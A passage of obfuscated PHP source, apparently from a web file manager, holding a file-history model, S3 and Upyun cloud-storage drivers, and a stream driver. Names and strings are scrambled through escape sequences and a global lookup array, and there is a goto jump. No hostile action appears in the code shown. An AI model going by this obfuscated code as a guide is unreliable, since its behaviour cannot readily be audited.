$³¢¯‡×Ò[$èŒŞïğ[2094]] = $³¢¯‡×Ò[$èŒŞïğ[87]]; $³¢¯‡×Ò[$èŒŞïğ[2079]] = $³¢¯‡×Ò[$èŒŞïğ[2094]][$èŒŞïğ[440]]; $³¢¯‡×Ò[$èŒŞïğ[87]] = !1; $³¢¯‡×Ò[$èŒŞïğ[440]] = $èŒŞïğ[12]; } $³¢¯‡×Ò[$èŒŞïğ[2023]] = $Õ±şë´˜[$³¢¯‡×Ò[$èŒŞïğ[1661]]]; } unset($³¢¯‡×Ò); $åºÂîãî[$èŒŞïğ[398]] = $ƒÓ…„¥İ; return $åºÂîãî; } public function removeBySource($Èó™áü) { $çÆÀÍ­ = array($_SERVER[¡“ËÌ§œ][455] => $Èó™áü); $this->where($çÆÀÍ­)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\143\x65\137\150\151\x73\x74\157\x72\x79"; public function historyCount($“‘ÌëÏ½) { $×“’šâ» =& $_SERVER[¡“ËÌ§œ]; if (!$“‘ÌëÏ½) { return array(); } if (is_string($“‘ÌëÏ½) || is_int($“‘ÌëÏ½)) { $“‘ÌëÏ½ = array($“‘ÌëÏ½); } $¬Ù«¯™Õ = array($×“’šâ»[440], $×“’šâ»[1884] => $×“’šâ»[529]); $¼¥Û¸¾š = array($×“’šâ»[440] => array($×“’šâ»[7], $“‘ÌëÏ½)); $È›³æ² = $this->field($¬Ù«¯™Õ)->where($¼¥Û¸¾š)->group($×“’šâ»[440])->select(); return array_to_keyvalue($È›³æ², $×“’šâ»[440], $×“’šâ»[529]); } public function addHistory($²®ïÊ³€, $«È®ØúÌ = '') { $ŠÖ¹ääë =& $_SERVER[¡“ËÌ§œ]; $Ô»û·äû = array($ŠÖ¹ääë[455] => $²®ïÊ³€[$ŠÖ¹ääë[440]], $ŠÖ¹ääë[1652] => isset($²®ïÊ³€[$ŠÖ¹ääë[494]]) ? $²®ïÊ³€[$ŠÖ¹ääë[494]] : $²®ïÊ³€[$ŠÖ¹ääë[492]], $ŠÖ¹ääë[507] => $²®ïÊ³€[$ŠÖ¹ääë[506]], $ŠÖ¹ääë[583] => $²®ïÊ³€[$ŠÖ¹ääë[76]], $ŠÖ¹ääë[2095] => $«È®ØúÌ); if ($GLOBALS[$ŠÖ¹ääë[6]][$ŠÖ¹ääë[89]][$ŠÖ¹ääë[1237]] >= 1) { $this->historyAutoClear($Ô»û·äû[$ŠÖ¹ääë[440]]); $this->add($Ô»û·äû); } Hook::trigger($ŠÖ¹ääë[2096], $Ô»û·äû); Model($ŠÖ¹ääë[2097])->eventFileEdit($²®ïÊ³€[$ŠÖ¹ääë[440]]); } private function historyAutoClear($·ğÙ¿½Ğ) { $ş”Çì¿š =& $_SERVER[¡“ËÌ§œ]; $ãŸ¸£Ê¶ = Model($ş”Çì¿š[790])->get($ş”Çì¿š[1259]); $ŠĞá¤ü» = $GLOBALS[$ş”Çì¿š[6]][$ş”Çì¿š[89]][$ş”Çì¿š[1237]]; $÷®Ò®ğ× = $ãŸ¸£Ê¶ == $ş”Çì¿š[1260] ? min(5, $ŠĞá¤ü») : $ŠĞá¤ü»; $÷®Ò®ğ× = $÷®Ò®ğ× <= 0 ? 0 : $÷®Ò®ğ× - 1; if ($÷®Ò®ğ× >= 500) { return; } $º±£¦®„ = array($ş”Çì¿š[455] => $·ğÙ¿½Ğ); $ æõ¾ğ = $this->field($ş”Çì¿š[2098])->where($º±£¦®„)->order($ş”Çì¿š[2092])->select(); if (!$ æõ¾ğ || $÷®Ò®ğ× >= count($ æõ¾ğ)) { return; } $ÁË†¿Û = array_to_keyvalue($ æõ¾ğ, $ş”Çì¿š[12], $ş”Çì¿š[437]); $ÁË†¿Û = array_slice($ÁË†¿Û, $÷®Ò®ğ×); $ù®Üåß = array_to_keyvalue($ æõ¾ğ, $ş”Çì¿š[12], $ş”Çì¿š[506]); $ù®Üåß = array_slice($ù®Üåß, $÷®Ò®ğ×); if (!$ÁË†¿Û || !$ù®Üåß) { return; } $º±£¦®„ = array($ş”Çì¿š[457] => array($ş”Çì¿š[7], $ÁË†¿Û)); $this->where($º±£¦®„)->delete(); Model($ş”Çì¿š[509])->remove($ù®Üåß); } public function listData($Ê³±‰Ğ÷) { $ûÙÂ©ŒÔ =& $_SERVER[¡“ËÌ§œ]; $ü¾…à©ê = array($ûÙÂ©ŒÔ[455] => $Ê³±‰Ğ÷); $÷°ğéÆœ = $ûÙÂ©ŒÔ[2099]; $Áû÷€¤¾ = $this->field($÷°ğéÆœ)->where($ü¾…à©ê)->order($ûÙÂ©ŒÔ[2092])->selectPage(); $this->_listAppendUser($Áû÷€¤¾[$ûÙÂ©ŒÔ[398]]); $Ÿ‚Š”›€ = Model($ûÙÂ©ŒÔ[790])->get($ûÙÂ©ŒÔ[1259]); $¸Ñå««€ = 5; if ($Ÿ‚Š”›€ == $ûÙÂ©ŒÔ[1260]) { $Áû÷€¤¾[$ûÙÂ©ŒÔ[398]] = array_slice($Áû÷€¤¾[$ûÙÂ©ŒÔ[398]], 0, $¸Ñå««€); $Áû÷€¤¾[$ûÙÂ©ŒÔ[395]] = array($ûÙÂ©ŒÔ[2100] => 1, $ûÙÂ©ŒÔ[2101] => 20, $ûÙÂ©ŒÔ[2102] => 1, $ûÙÂ©ŒÔ[2103] => count($Áû÷€¤¾[$ûÙÂ©ŒÔ[398]])); } return $Áû÷€¤¾; } protected function _listAppendUser(&$Ö²¤Ôü†) { $¹¼ÈØÊ‰ =& $_SERVER[¡“ËÌ§œ]; $õö¬“†ñ = array_to_keyvalue($Ö²¤Ôü†, $¹¼ÈØÊ‰[12], $¹¼ÈØÊ‰[1661]); $Ïİ“¸Á = Model($¹¼ÈØÊ‰[563])->userListInfo($õö¬“†ñ); foreach ($Ö²¤Ôü† as &$¸Ùğ„é) { $°ø†ÈÅ˜ = $¸Ùğ„é[$¹¼ÈØÊ‰[1661]]; $¸Ùğ„é[$¹¼ÈØÊ‰[492]] = $Ïİ“¸Á[$°ø†ÈÅ˜] ? $Ïİ“¸Á[$°ø†ÈÅ˜] : !1; } unset($¸Ùğ„é); } public function fileInfo($¸ùòİ¼ç) { $Ó°×ô =& $_SERVER[¡“ËÌ§œ]; $ó£òÆè = $this->tablePrefix; $”šçª±Ú = "{$ó£òÆè}\x69\157\x5f\x66\151\154\x65\40\x66\x69\x6c\x65\163\x20\x6f\x6e\40\x66\151\x6c\145\163\x2e\x66\x69\154\x65\x49\104\x20\x3d\x20\x68\151\x73\x74\x6f\x72\x79\x2e\x66\x69\154\x65\111\104"; return $this->alias($Ó°×ô[2104])->where(array($Ó°×ô[457] => $¸ùòİ¼ç))->join($”šçª±Ú, $Ó°×ô[2105])->find(); } public function removeItem($—ƒ—ü¶‚) { $‚ÇÇĞ¯¯ =& $_SERVER[¡“ËÌ§œ]; $˜ÒÕè˜Á = array($‚ÇÇĞ¯¯[457] => $—ƒ—ü¶‚); $ëı¥ Äì = $this->where($˜ÒÕè˜Á)->find(); if ($ëı¥ Äì) { $ïÅˆ×Ë– = $this->where($˜ÒÕè˜Á)->delete(); Model($‚ÇÇĞ¯¯[509])->remove($ëı¥ Äì[$‚ÇÇĞ¯¯[506]]); return $ïÅˆ×Ë–; } return !1; } public function removeBySource($‚ÔŸñ‡) { $ûâŸÌå» =& $_SERVER[¡“ËÌ§œ]; if (!$‚ÔŸñ‡) { return !1; } if (!is_array($‚ÔŸñ‡)) { $‚ÔŸñ‡ = array($‚ÔŸñ‡); } $´ÅúÒªÚ = array($ûâŸÌå»[455] => array($ûâŸÌå»[7], $‚ÔŸñ‡)); $¸–¾ã«Ü = $this->field($ûâŸÌå»[507])->where($´ÅúÒªÚ)->select(); if ($¸–¾ã«Ü) { $this->where($´ÅúÒªÚ)->delete(); $¬ÉÒ×¿¤ = array_to_keyvalue($¸–¾ã«Ü, $ûâŸÌå»[12], $ûâŸÌå»[506]); Model($ûâŸÌå»[509])->remove($¬ÉÒ×¿¤); } return !0; } public function setDetail($ŸÈëÄğˆ, $ûº°òÛ§) { $¯‡àÏø© =& $_SERVER[¡“ËÌ§œ]; return $this->where(array($¯‡àÏø©[457] => $ŸÈëÄğˆ))->save(array($¯‡àÏø©[2095] => $ûº°òÛ§)); } public function rollbackToItem($²–‰÷¯‹, $‹Èšü°ˆ) { $ŸŠ‘ˆ«† =& $_SERVER[¡“ËÌ§œ]; $ë†üÃ‚ˆ = Model($ŸŠ‘ˆ«†[845])->sourceInfo($²–‰÷¯‹); $this->addHistory($ë†üÃ‚ˆ, LNG($ŸŠ‘ˆ«†[2106])); $Ü×¡ü”© = $this->find($‹Èšü°ˆ); $ÎŠ¼¨Ü° = array($ŸŠ‘ˆ«†[506] => $Ü×¡ü”©[$ŸŠ‘ˆ«†[506]], $ŸŠ‘ˆ«†[76] => $Ü×¡ü”©[$ŸŠ‘ˆ«†[76]], $ŸŠ‘ˆ«†[85] => time(), $ŸŠ‘ˆ«†[494] => USER_ID); Model($ŸŠ‘ˆ«†[845])->where(array($ŸŠ‘ˆ«†[440] => $²–‰÷¯‹))->save($ÎŠ¼¨Ü°); return $this->where(array($ŸŠ‘ˆ«†[457] => $‹Èšü°ˆ))->delete(); } public function clearSame($ÓìüŠıÁ) { $Ù‰ûêàÚ =& $_SERVER[¡“ËÌ§œ]; $¬ô …Ä = $this->listData($ÓìüŠıÁ); $š²‰¼Û = array_to_keyvalue_group($¬ô …Ä, $Ù‰ûêàÚ[506]); $í«…é = array(); $”èÌ¼ü = array(); foreach ($š²‰¼Û as $úä´Ü…¤) { if (!$úä´Ü…¤ || count($úä´Ü…¤) <= 1) { continue; } foreach ($úä´Ü…¤ as $ÚÁÄŞÜ) { $í«…é[] = $ÚÁÄŞÜ[$Ù‰ûêàÚ[506]]; $”èÌ¼ü[] = $ÚÁÄŞÜ[$Ù‰ûêàÚ[437]]; } } if (!$”èÌ¼ü) { return; } $this->where(array($Ù‰ûêàÚ[437] => array($Ù‰ûêàÚ[7], $”èÌ¼ü)))->delete(); Model($Ù‰ûêàÚ[509])->remove($í«…é); } public function userSpace() { $ƒäé¢¯û =& $_SERVER[¡“ËÌ§œ]; $Ô”Õ¦Èû = $this->tablePrefix; $ƒßòÚÜ = array($ƒäé¢¯û[1652] => USER_ID); $Ê‰¨›‰Ä = "{$Ô”Õ¦Èû}\x69\157\137\x66\x69\154\x65\x20\x66\151\x6c\145\163\x20\x6f\x6e\40\146\x69\x6c\x65\x73\x2e\x66\151\154\145\x49\x44\40\75\x20\x68\151\163\x74\157\162\x79\x2e\146\x69\154\145\x49\104"; return $this->alias($ƒäé¢¯û[2104])->where($ƒßòÚÜ)->join($Ê‰¨›‰Ä, $ƒäé¢¯û[2105])->sum($ƒäé¢¯û[76]); } } goto B¯ÉåíÏĞÁ; Cé–É‚ö·: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÍÅÛ¢ß) { parent::__construct($ÍÅÛ¢ß); } public function uploadFormData($ÀàÇ–’È, $Ú‡Ûßè = 3600) { $ı¦ï”®Ç =& $_SERVER[¡“ËÌ§œ]; $§˜ÂÎìÄ = $ı¦ï”®Ç[199]; $éÖÅÖ† = $ı¦ï”®Ç[238]; $ÑĞØÑáê = $ı¦ï”®Ç[62]; $„İ´ä» = gmdate($ı¦ï”®Ç[239]); $Å«ÑìÉ = gmdate($ı¦ï”®Ç[240]); $îëñÔ“æ = $ı¦ï”®Ç[241]; $ÎÕˆ—Ñç = $Ú‡Ûßè . $ı¦ï”®Ç[12]; $ëˆĞßÙ = $ı¦ï”®Ç[242]; $ë…„’– = array($this->accessKey, $Å«ÑìÉ, $this->region, $ÑĞØÑáê, $îëñÔ“æ); $Â‹™Ÿµ† = implode($ı¦ï”®Ç[8], $ë…„’–); $€Â³÷‚î = array($ı¦ï”®Ç[243] => gmdate($ı¦ï”®Ç[1345], strtotime($ı¦ï”®Ç[245])), $ı¦ï”®Ç[246] => array(array($ı¦ï”®Ç[247] => $this->bucket), array($ı¦ï”®Ç[248] => $§˜ÂÎìÄ), array($ı¦ï”®Ç[249], $ı¦ï”®Ç[250], $ı¦ï”®Ç[12]), array($ı¦ï”®Ç[249], $ı¦ï”®Ç[251], $ı¦ï”®Ç[12]), array($ı¦ï”®Ç[249], $ı¦ï”®Ç[252], $ı¦ï”®Ç[12]), array($ı¦ï”®Ç[253] => $ëˆĞßÙ), array($ı¦ï”®Ç[254] => $Â‹™Ÿµ†), array($ı¦ï”®Ç[255] => $éÖÅÖ†), array($ı¦ï”®Ç[256] => $„İ´ä»), array($ı¦ï”®Ç[257] => $ÎÕˆ—Ñç))); $ğª‘©¨Ã = base64_encode(json_encode($€Â³÷‚î)); $ü¦œ‰úì = hash_hmac($ı¦ï”®Ç[258], $Å«ÑìÉ, $ı¦ï”®Ç[259] . $this->secret, !0); $©¢’Ï²› = hash_hmac($ı¦ï”®Ç[258], $this->region, $ü¦œ‰úì, !0); $½£ÒŸ‡ğ = hash_hmac($ı¦ï”®Ç[258], $ÑĞØÑáê, $©¢’Ï²›, !0); $ öıì€Û = hash_hmac($ı¦ï”®Ç[258], $îëñÔ“æ, $½£ÒŸ‡ğ, !0); $³Ğ†Å¿ = hash_hmac($ı¦ï”®Ç[258], $ğª‘©¨Ã, $ öıì€Û); $óÜ¬¥À˜ = array($ı¦ï”®Ç[215] => $ı¦ï”®Ç[12], $ı¦ï”®Ç[260] => $ı¦ï”®Ç[12], $ı¦ï”®Ç[248] => $§˜ÂÎìÄ, $ı¦ï”®Ç[253] => $ëˆĞßÙ, $ı¦ï”®Ç[261] => $ğª‘©¨Ã, $ı¦ï”®Ç[262] => $Â‹™Ÿµ†, $ı¦ï”®Ç[263] => $éÖÅÖ†, $ı¦ï”®Ç[264] => $„İ´ä», $ı¦ï”®Ç[265] => $ÎÕˆ—Ñç, $ı¦ï”®Ç[266] => $³Ğ†Å¿, $ı¦ï”®Ç[182] => $this->getHost()); return $óÜ¬¥À˜; } public function multiUploadFormData($ÙæñÊŠï, $ı‘á‰§Õ = 3600) { $È„ª€íº =& $_SERVER[¡“ËÌ§œ]; $¨ÕóĞ¥ = gmdate($È„ª€íº[1448]); $Âõ­ìàŒ = array(); $ĞÃûİÄ± = $this->client->getUploadId($this->bucket, $ÙæñÊŠï, $Âõ­ìàŒ); if (!$ĞÃûİÄ±) { return !1; } return array($È„ª€íº[223] => $ĞÃûİÄ±, $È„ª€íº[182] => $this->getHost() . $È„ª€íº[8] . $this->pathEncode($ÙæñÊŠï), $È„ª€íº[224] => $¨ÕóĞ¥, $È„ª€íº[94] => $ÙæñÊŠï); } public function multiUploadAuthData($ğ¼õ¼ú‚, $ëÖÃ¼ŒÎ = array()) { $½¯è¹˜™ =& $_SERVER[¡“ËÌ§œ]; $æ»”¸­è = isset($ëÖÃ¼ŒÎ[$½¯è¹˜™[174]]) ? $ëÖÃ¼ŒÎ[$½¯è¹˜™[174]] : $½¯è¹˜™[12]; $ÂÍ§¤Íñ = $ëÖÃ¼ŒÎ[$½¯è¹˜™[94]]; unset($ëÖÃ¼ŒÎ[$½¯è¹˜™[94]]); if (isset($ëÖÃ¼ŒÎ[$½¯è¹˜™[225]])) { return $this->listUploadParts($ÂÍ§¤Íñ, $ëÖÃ¼ŒÎ); } $¹æÉ§€Ô = array(); if (isset($ëÖÃ¼ŒÎ[$½¯è¹˜™[1449]])) { $¹æÉ§€Ô[$½¯è¹˜™[1450]] = $ëÖÃ¼ŒÎ[$½¯è¹˜™[1449]]; } $í—î¤°ˆ = explode($½¯è¹˜™[184], $this->getHost()); $³Í¾æßÅ = array($½¯è¹˜™[1451] => $í—î¤°ˆ[1], $½¯è¹˜™[1452] => $½¯è¹˜™[12], $½¯è¹˜™[215] => $½¯è¹˜™[120], $½¯è¹˜™[260] => $ëÖÃ¼ŒÎ[$½¯è¹˜™[76]]); $ó¥Ï®ìî = $½¯è¹˜™[228]; $ªÒêŒ´¤ = $½¯è¹˜™[8] . $this->pathEncode($ÂÍ§¤Íñ) . $æ»”¸­è; $…©®ôºÁ = $this->client->__getSignatureV4($¹æÉ§€Ô, $³Í¾æßÅ, $ó¥Ï®ìî, $ªÒêŒ´¤); if (strpos($æ»”¸­è, $½¯è¹˜™[227]) === 0) { if (isset($¹æÉ§€Ô[$½¯è¹˜™[1450]])) { $ò€ğÊ©° = $¹æÉ§€Ô[$½¯è¹˜™[1450]]; } else { if (isset($…©®ôºÁ[$½¯è¹˜™[1450]])) { $ò€ğÊ©° = $…©®ôºÁ[$½¯è¹˜™[1450]]; } else { $ò€ğÊ©° = hash($½¯è¹˜™[258], $½¯è¹˜™[12]); } } return array($½¯è¹˜™[234] => $…©®ôºÁ[$½¯è¹˜™[234]], $½¯è¹˜™[1450] => $ò€ğÊ©°, $½¯è¹˜™[224] => $…©®ôºÁ[$½¯è¹˜™[1453]]); } return $…©®ôºÁ[$½¯è¹˜™[234]]; } public function listUploadParts($ÃÌŒÀÀ¿, $ıº«Éìò = array()) { $ÌÀ€ßê =& $_SERVER[¡“ËÌ§œ]; $ïùà¬· = str_replace($ÌÀ€ßê[235], $ÌÀ€ßê[12], $ıº«Éìò[$ÌÀ€ßê[174]]); $Î×ØÙö¬ = $this->client->listParts($this->bucket, $ÃÌŒÀÀ¿, $ïùà¬·); if (!$Î×ØÙö¬) { return !1; } $±¶×‡±Š = $ÌÀ€ßê[1454]; foreach ($Î×ØÙö¬ as $şª„÷Ğ) { $±¶×‡±Š .= $ÌÀ€ßê[1455] . "\x3c\120\141\x72\x74\116\165\155\x62\x65\162\76{$şª„÷Ğ[$ÌÀ€ßê[1409]]}\74\57\120\141\x72\164\116\x75\x6d\142\x65\162\x3e\xa" . "\x3c\x45\124\141\147\x3e{$şª„÷Ğ[$ÌÀ€ßê[1410]]}\74\x2f\x45\124\x61\x67\76\12" . $ÌÀ€ßê[1456]; } $±¶×‡±Š .= $ÌÀ€ßê[1457]; $¹Êëë ã = array(); $Ñ·™Ã§à = explode($ÌÀ€ßê[184], $this->getHost()); $…ÇªÙŞâ = array($ÌÀ€ßê[1451] => $Ñ·™Ã§à[1], $ÌÀ€ßê[215] => $ÌÀ€ßê[120], $ÌÀ€ßê[260] => strlen($±¶×‡±Š)); $¾ÚÒÎ· = $ÌÀ€ßê[226]; $ó‰°¹ = $ÌÀ€ßê[8] . $this->pathEncode($ÃÌŒÀÀ¿) . $ıº«Éìò[$ÌÀ€ßê[174]]; $™„é¸áá = $this->client->__getSignatureV4($¹Êëë ã, $…ÇªÙŞâ, $¾ÚÒÎ·, $ó‰°¹, $±¶×‡±Š); return array($ÌÀ€ßê[234] => $™„é¸áá[$ÌÀ€ßê[234]], $ÌÀ€ßê[224] => $™„é¸áá[$ÌÀ€ßê[1453]], $ÌÀ€ßê[236] => $Î×ØÙö¬, $ÌÀ€ßê[1450] => $™„é¸áá[$ÌÀ€ßê[1450]]); } public function link($‹ˆÊœãù, $ä”âÔ¬À = array()) { return parent::link($‹ˆÊœãù, $ä”âÔ¬À); } public function fileOut($³ĞÃÅ—ø, $ÕÜïêã = false, $åÙ“Ã¾Ä = false, $ ¹´¹Şà = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¡“ËÌ§œ][1458])) { return parent::fileOutServer($³ĞÃÅ—ø, $ÕÜïêã, $åÙ“Ã¾Ä, $ ¹´¹Şà); } parent::fileOut($³ĞÃÅ—ø, $ÕÜïêã, $åÙ“Ã¾Ä, $ ¹´¹Şà); } public function fileOutImage($èÖÉ•Æâ, $î°ŞéÏª = 250) { if (strstr($this->endpoint, $_SERVER[¡“ËÌ§œ][1458])) { return parent::fileOutImageServer($èÖÉ•Æâ, $î°ŞéÏª); } parent::fileOutImage($èÖÉ•Æâ, $î°ŞéÏª); } public function fileOutLink($åöñ¯²) { $‡×¾ú±Ö =& $_SERVER[¡“ËÌ§œ]; if (substr($åöñ¯², 0, 7) == $‡×¾ú±Ö[1351]) { $åöñ¯² = $‡×¾ú±Ö[1352] . substr($åöñ¯², 7); } header($‡×¾ú±Ö[161] . $åöñ¯²); die; } public function getHost() { $ÕÙ“áöë =& $_SERVER[¡“ËÌ§œ]; $‰Á¢³ = str_rtrim(parent::getHost(), $ÕÙ“áöë[8] . $this->bucket); $‰Á¢³ = explode($ÕÙ“áöë[184], $‰Á¢³); return $‰Á¢³[0] . $ÕÙ“áöë[184] . $this->bucket . $ÕÙ“áöë[10] . $‰Á¢³[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÚúÊïı’, $÷ù÷ï›¯ = 0) { parent::__construct(); $this->source = $ÚúÊïı’; $this->sourceSize = $÷ù÷ï›¯; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‡Š©³äÇ = false) { return $this->sourceSize; } public function getContent($²‘…¿… = false) { return $this->fileSubstr($²‘…¿…, 0, $this->sourceSize); } public function fileSubstr($û¨Öâ›Ç = false, $–é¿‚öÔ = 0, $Í®›ôõó = 0) { if (!$Í®›ôõó) { $Í®›ôõó = $this->sourceSize; } $ğ”²š—„ = $this->sourceSize - $–é¿‚öÔ; if ($Í®›ôõó >= $ğ”²š—„) { $Í®›ôõó = $ğ”²š—„; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $–é¿‚öÔ, $Í®›ôõó); } if ($this->sourceType == self::TYPE_FILE) { if ($Í®›ôõó <= 0) { return $_SERVER[¡“ËÌ§œ][12]; } $‡ß²ôÒÕ = ftell($this->source); fseek_64($this->source, $‡ß²ôÒÕ + $–é¿‚öÔ); $ÂÜÈ½¥ = @fread($this->source, $Í®›ôõó); fseek_64($this->source, $‡ß²ôÒÕ); return $ÂÜÈ½¥; } } public function hashMd5($éœ†÷¾Í = false) { return md5($this->getContent()); } public static function hash($İ‚ëâœà, $ØÆ¼—¸ï = 0) { $˜èÎ”˜ı = new PathDriverStream($İ‚ëâœà, $ØÆ¼—¸ï); return $˜èÎ”˜ı->hashSimple($İ‚ëâœà); } public static function md5($‰íÍ­ó×, $ åÓÔ±‰ = 0) { $ğ÷º ê½ = new PathDriverStream($‰íÍ­ó×, $ åÓÔ±‰); return $ğ÷º ê½->hashMd5($‰íÍ­ó×); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\57\57\x76\60\x2e\x61\x70\151\56\x75\x70\x79\x75\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¸†»ÍşÜ) { parent::__construct(); $this->_init($¸†»ÍşÜ); } public function _init($Ì—ğë³á) { $©»ï¢×å =& $_SERVER[¡“ËÌ§œ]; foreach ($Ì—ğë³á as $ğ¾ûÏÊî => $İê±‰å¬) { if (isset($this->{$ğ¾ûÏÊî})) { $this->{$ğ¾ûÏÊî} = $İê±‰å¬; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($©»ï¢×å[1459] . LNG($©»ï¢×å[1390])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($È¼ğÀ¾¦, $ì£ßÓ³ = "\107\x45\x54") { $äÅ¡¾«Ç =& $_SERVER[¡“ËÌ§œ]; $õá¨úŠµ = gmdate($äÅ¡¾«Ç[1423]); $µÜ»˜ø = base64_encode(hash_hmac($äÅ¡¾«Ç[1460], "{$ì£ßÓ³}\46{$È¼ğÀ¾¦}\x26{$õá¨úŠµ}", md5("{$this->userpass}"), !0)); $ùÏ«­®½ = array("\101\x75\164\150\157\x72\151\172\141\164\151\x6f\x6e\x3a\125\x50\x59\125\116\x20{$this->username}\x3a{$µÜ»˜ø}", "\x44\141\x74\x65\x3a{$õá¨úŠµ}"); return $ùÏ«­®½; } public function ussRequest($ àë‹­, $ì€Â¡ıİ = "\x47\105\124", $’§Ñâß = false, $°¾Êç›ö = false, $Ú™“ˆäõ = false) { $×·«Ûû¾ =& $_SERVER[¡“ËÌ§œ]; $ àë‹­ = trim($ àë‹­, $×·«Ûû¾[8]); $˜Ï÷¡± = "\x2f{$this->bucket}\57{$ àë‹­}"; $ÅßĞ†Û¼ = $this->ussHeaders($˜Ï÷¡±, $ì€Â¡ıİ); if ($°¾Êç›ö) { $ÅßĞ†Û¼ = array_merge($ÅßĞ†Û¼, $°¾Êç›ö); } $™»¸ÑÀ÷ = url_request($this->endpoint . $˜Ï÷¡±, $ì€Â¡ıİ, $’§Ñâß, $ÅßĞ†Û¼, $Ú™“ˆäõ); if (!$™»¸ÑÀ÷) { return array($×·«Ûû¾[1232] => !1, $×·«Ûû¾[1222] => $×·«Ûû¾[1461]); } if (strtolower($ì€Â¡ıİ) == $×·«Ûû¾[197] || in_array($™»¸ÑÀ÷[$×·«Ûû¾[1232]], array($×·«Ûû¾[242], $×·«Ûû¾[1462]))) { $’§Ñâß = $™»¸ÑÀ÷[$×·«Ûû¾[1463]]; } else { $’§Ñâß = json_decode($™»¸ÑÀ÷[$×·«Ûû¾[1222]], !0); if (!$’§Ñâß) { $’§Ñâß = $™»¸ÑÀ÷[$×·«Ûû¾[1222]]; } else { if (!$™»¸ÑÀ÷[$×·«Ûû¾[770]] && isset($’§Ñâß[$×·«Ûû¾[1464]])) { $’§Ñâß = $’§Ñâß[$×·«Ûû¾[1464]]; } } } return array($×·«Ûû¾[1232] => $™»¸ÑÀ÷[$×·«Ûû¾[770]], $×·«Ûû¾[1222] => $’§Ñâß); } public function mkfile($ï½ˆõÉŞ, $êƒ–¥’ª = '', $ÚÏ™š¬ = REPEAT_RENAME) { if ($this->setContent($ï½ˆõÉŞ, $êƒ–¥’ª)) { return $this->getPathOuter($ï½ˆõÉŞ); } return !1; } public function mkdir($›Ö”ãç, $–Ì´Îä­ = REPEAT_SKIP) { $°ĞÜö» =& $_SERVER[¡“ËÌ§œ]; $æÌ€¦Û¼ = trim($›Ö”ãç, $°ĞÜö»[8]); if ($this->_isFolder($æÌ€¦Û¼)) { return $this->getPathOuter($æÌ€¦Û¼); } $ß€¥ìÚÙ = array($°ĞÜö»[1465]); $¯‡‚ş§Š = $this->ussRequest($æÌ€¦Û¼, $°ĞÜö»[226], !1, $ß€¥ìÚÙ); return $¯‡‚ş§Š[$°ĞÜö»[1232]] ? $this->getPathOuter($æÌ€¦Û¼) : !1; } public function copyFile($ƒÂı¹¦…, $³ÙîÚ¬) { $ë‹åß´Ğ =& $_SERVER[¡“ËÌ§œ]; $“ ¦ÛóÆ = array($ë‹åß´Ğ[1466] . "\57{$this->bucket}\x2f{$ƒÂı¹¦…}", $ë‹åß´Ğ[1467]); $·‘°áÌ° = $this->ussRequest($³ÙîÚ¬, $ë‹åß´Ğ[228], !1, $“ ¦ÛóÆ); return $·‘°áÌ°[$ë‹åß´Ğ[1232]] ? !0 : $this->getPathOuter($³ÙîÚ¬); } public function moveFile($Û¬“÷ß, $ÈØ¥œ¦ñ) { $úï¼º¡ =& $_SERVER[¡“ËÌ§œ]; $Öå¶¼í = array($úï¼º¡[1468] . "\x2f{$this->bucket}\x2f{$Û¬“÷ß}", $úï¼º¡[1467]); $¸ïš‰¹¥ = $this->ussRequest($ÈØ¥œ¦ñ, $úï¼º¡[228], !1, $Öå¶¼í); return $¸ïš‰¹¥[$úï¼º¡[1232]] ? !0 : $this->getPathOuter($ÈØ¥œ¦ñ); } public function delFile($•Šˆ±üŒ) { $òŒ’˜Ö„ =& $_SERVER[¡“ËÌ§œ]; $È…„ì–ö = $this->ussRequest($•Šˆ±üŒ, $òŒ’˜Ö„[1469]); return $È…„ì–ö[$òŒ’˜Ö„[1232]] ? !0 : !1; } public function delFolder($ ÷ÑÄÌà) { $ŞÎöî =& $_SERVER[¡“ËÌ§œ]; if (!$this->exist($ ÷ÑÄÌà)) { return !0; } $this->listItemCache = !1; $ş¨Çøµå = $Ï¿‘ıØÌ = array(); $this->fileList($ ÷ÑÄÌà, $ş¨Çøµå, $Ï¿‘ıØÌ, !0); $this->listItemCache = !0; foreach ($Ï¿‘ıØÌ as $„„Ú„º) { $ìŞ±”„ = $this->ussRequest($„„Ú„º[$ŞÎöî[32]], $ŞÎöî[1469]); if (!$ìŞ±”„[$ŞÎöî[1232]]) { return !1; } } foreach ($ş¨Çøµå as $Äï¹…Ú²) { $ìŞ±”„ = $this->ussRequest($Äï¹…Ú², $ŞÎöî[1469]); if (!$ìŞ±”„[$ŞÎöî[1232]]) { return !1; } } $ìŞ±”„ = $this->ussRequest($ ÷ÑÄÌà, $ŞÎöî[1469]); return $ìŞ±”„[$ŞÎöî[1232]]; } public function rename($êö»ä¨¦, $Îà¼ÉÜ) { if ($this->isFile($êö»ä¨¦)) { $Îà¼ÉÜ = get_path_father($êö»ä¨¦) . $Îà¼ÉÜ; return $this->moveFile($êö»ä¨¦, $Îà¼ÉÜ); } return $this->renameObject($êö»ä¨¦, $Îà¼ÉÜ); } public function fileInfo($³´û÷Ö, $ĞÀíéöÒ = false, $˜£¨ø¯ = array()) { $ïü„Ùàı =& $_SERVER[¡“ËÌ§œ]; $æé´©ğ = array($ïü„Ùàı[32] => $this->pathThis($³´û÷Ö), $ïü„Ùàı[84] => $this->getPathOuter($ïü„Ùàı[8] . $³´û÷Ö), $ïü„Ùàı[33] => $ïü„Ùàı[200], $ïü„Ùàı[76] => isset($˜£¨ø¯[$ïü„Ùàı[76]]) ? $˜£¨ø¯[$ïü„Ùàı[76]] : 0, $ïü„Ùàı[174] => $this->ext($³´û÷Ö)); if ($ĞÀíéöÒ) { return $æé´©ğ; } $æé´©ğ[$ïü„Ùàı[201]] = 